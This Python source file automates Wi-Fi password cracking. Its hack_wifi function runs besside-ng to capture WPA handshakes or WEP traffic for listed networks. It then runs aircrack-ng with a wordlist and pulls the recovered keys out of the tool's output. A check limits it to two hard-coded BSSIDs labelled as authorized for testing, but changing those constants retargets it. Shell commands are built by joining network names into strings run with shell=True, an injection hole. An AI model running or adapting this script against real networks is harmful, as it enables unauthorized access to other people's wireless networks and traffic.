import  subprocess
import time

#networks authorized to be tested
WPANET2TEST="DC:39:6F:FD:5D:EB" # "FritzBox"
WEPNET2TEST="E8:DE:27:68:3C:E9"


# A function is defined that receives the found networks, captures the packets and tries to retrieve the password
def hack_wifi(wifilist):
    # AIRMON-NG starts here
    psw = []
    # try:
    #     subprocess.call(["sudo", "airmon-ng", "check", "kill"])
    #     time.sleep(5)
    #     subprocess.call(["sudo", "airmon-ng", "start", "wlan1"])
    #     print("\nI'm trying to activate monitoring mode  on wlan 1\nPlease wait....\n")
    #     time.sleep(5)
    #
    #
    # except ValueError as e:
    #
    #     print("Error:", e)
    #     print("Network card monitor mode error.\nThe program will be terminated")

    try:
        for i in range(len(wifilist[0])):
            if wifilist[4][i] == WEPNET2TEST or wifilist[4][i] ==  WPANET2TEST:
                if i == 0:
                    if ((str(wifilist[2][i])) == "wpa2" or (str(wifilist[2][i])) == "wpa") and (
                            (wifilist[3][i]) in range(12)):
                        print("\nI'm trying to find the Wi-Fi packet capture", (wifilist[0][i]), " with encryption",
                              (wifilist[2][i]), "On the chanel", (str(wifilist[3][i])), "\nPlease wait....\n")
                        try:
                            subprocess.call(["sudo", "-s", "besside-ng", "-v", "-W", "-b", (wifilist[4][i]), "-c",
                                             (str(wifilist[3][i])), "wlan1"])
                            print("\nI'm trying to find the Wi-Fi packet capture", (wifilist[0][i]), "with encryption",
                                  (wifilist[2][i]), "\nPlease wait....\n")
                            time.sleep(5)
                        except:
                            print("Network card monitor mode error.\nThe program will be terminated")

                        wifi_txt = (str(wifilist[0][i])).replace(" ", "_")

                        subprocess.call(
                            "sudo -s aircrack-ng -b " + (wifilist[4][i]) + " -w ./password.lst ./wpa.cap>" + str(
                                wifi_txt + ".txt"), shell=True)
                        with open(((wifi_txt) + ".txt"), "r") as aprifile:
                            for x in aprifile:
                                y = x.find("KEY FOUND!")
                                if y > 1:
                                    a = x.split()
                                    print("\nThe password of the wifi network", wifilist[0][i], "is:", a[3])
                                    psw.append(a[3])

                    elif ((str(wifilist[2][i])) == "wep") and ((wifilist[3][i]) in range(12)):
                        print("\nI'm trying to find the Wi-Fi packet capture", (wifilist[0][i]), " with encryption",
                              (wifilist[2][i]), "On the chanel", (str(wifilist[3][i])), "\nPlease wait....\n")
                        try:
                            subprocess.call(
                                ["sudo", "-s", "besside-ng", "-b", (wifilist[4][i]), "-c", (str(wifilist[3][i])), "wlan1"])
                            print("\nI'm trying to find the wi-fi password", (wifilist[0][i]), "with encryption",
                                  (wifilist[2][i]), "\nPlease wait....\n")
                            time.sleep(5)
                        except:
                            print("Network card monitor mode error.\nThe program will be terminated")

                        wifi_txt1 = (str(wifilist[0][i])).replace(" ", "_")

                        subprocess.call(
                            "sudo -s aircrack-ng -b " + (wifilist[4][i]) + " ./wep.cap>" + str(wifi_txt1 + ".txt"),
                            shell=True)
                        with open(((wifi_txt1) + ".txt"), "r") as aprifile:
                            for x in aprifile:
                                y = x.find("KEY FOUND!")
                                if y > 1:
                                    a = x.split()
                                    print("\nThe password of the wifi network", wifilist[0][i], "is:", a[6])
                                    psw.append(a[6])


                    elif (str(wifilist[2][i])) == "None":
                        wifi_txt1 = (str(wifilist[0][i])).replace(" ", "_")
                        print("\nFree Wi-Fi:", wifilist[0][i], "!!!\n")
                        psw.append("")


                    elif ((wifilist[3][i]) > 12):
                        print("\nThe wifi network", wifilist[0][i],
                              "has a frequency that is out of range.\nSorry but it is not possible to attack it!!!!!!\n")
                        psw.append("")

                    else:
                        print("\nEncryption not yet supported...")
                #                 sys.exit(1)
                else:
                    if (((wifilist[4][i])) != ((wifilist[4][i - 1])) ):    #and ((wifilist[3][i])) != ((wifilist[3][i - 1]))
                        if ((str(wifilist[2][i])) == "wpa2" or (str(wifilist[2][i])) == "wpa") and (
                                (wifilist[3][i]) in range(12)):
                            print("\nI'm trying to find the Wi-Fi packet capture", (wifilist[0][i]), " with encryption",
                                  (wifilist[2][i]), "On the chanel", (str(wifilist[3][i])), "\nPlease wait....\n")
                            try:
                                subprocess.call(["sudo", "-s", "besside-ng", "-v", "-W", "-b", (wifilist[4][i]), "-c",
                                                 (str(wifilist[3][i])), "wlan1"])
                                print("\nI'm trying to find the wi-fi password", (wifilist[0][i]), "with encryption",
                                      (wifilist[2][i]), "\nPlease wait....\n")
                                time.sleep(5)
                            except:
                                print("Network card monitor mode error.\nThe program will be terminated")

                            wifi_txt = (str(wifilist[0][i])).replace(" ", "_")

                            subprocess.call(
                                "sudo -s aircrack-ng -b " + (wifilist[4][i]) + " -w ./password.lst ./wpa.cap>" + str(
                                    wifi_txt + ".txt"), shell=True)
                            with open(((wifi_txt) + ".txt"), "r") as aprifile:
                                for x in aprifile:
                                    y = x.find("KEY FOUND!")
                                    if y > 1:
                                        a = x.split()
                                        print("\nThe password of the wifi network", wifilist[0][i], "is:", a[3])
                                        psw.append(a[3])

                        elif ((str(wifilist[2][i])) == "wep") and ((wifilist[3][i]) in range(12)):
                            print("\nI'm trying to find the Wi-Fi packet capture", (wifilist[0][i]), " with encryption",
                                  (wifilist[2][i]), "On the chanel", (str(wifilist[3][i])), "\nPlease wait....\n")
                            try:
                                subprocess.call(
                                    ["sudo", "-s", "besside-ng", "-b", (wifilist[4][i]), "-c", (str(wifilist[3][i])),
                                     "wlan1"])
                                print("\nI'm trying to find the wi-fi password", (wifilist[0][i]), "with encryption",
                                      (wifilist[2][i]), "\nPlease wait....\n")
                                time.sleep(5)
                            except:
                                print("Network card monitor mode error.\nThe program will be terminated")

                            wifi_txt1 = (str(wifilist[0][i])).replace(" ", "_")

                            subprocess.call(
                                "sudo -s aircrack-ng -b " + (wifilist[4][i]) + " ./wep.cap>" + str(wifi_txt1 + ".txt"),
                                shell=True)
                            with open(((wifi_txt1) + ".txt"), "r") as aprifile:
                                for x in aprifile:
                                    y = x.find("KEY FOUND!")
                                    if y > 1:
                                        a = x.split()
                                        print("\nThe password of the wifi network", wifilist[0][i], "is:", a[6])
                                        psw.append(a[6])


                        elif (str(wifilist[2][i])) == "None":
                            wifi_txt1 = (str(wifilist[0][i])).replace(" ", "_")
                            print("\nThe wifi network", wifilist[0][i], "is free!!!\n")
                            psw.append("")


                        elif ((wifilist[3][i]) > 12):
                            print("\nThe wifi network", wifilist[0][i],
                                  " has a frequency that is out of range.\nSorry but it is not possible to attack it!!!\n")
                            psw.append("")

                        else:
                            print("\nEncryption not yet supported...")

                    else:
                        print("Network with the same parameters already scanned")
                        pos = len(psw) - 1
                        psw.append(psw[pos])


            else:
                print (f"\nBE CAREFUL!!! Wifi network {wifilist[0][i]} not allowed for testing!!!!!!")

    except ValueError as e:

        print("Error:", e)

        print()

        print("A network hardware problem has been reported.\nPlease restart the OS.")

    wifilist.append(psw)

    return (wifilist)
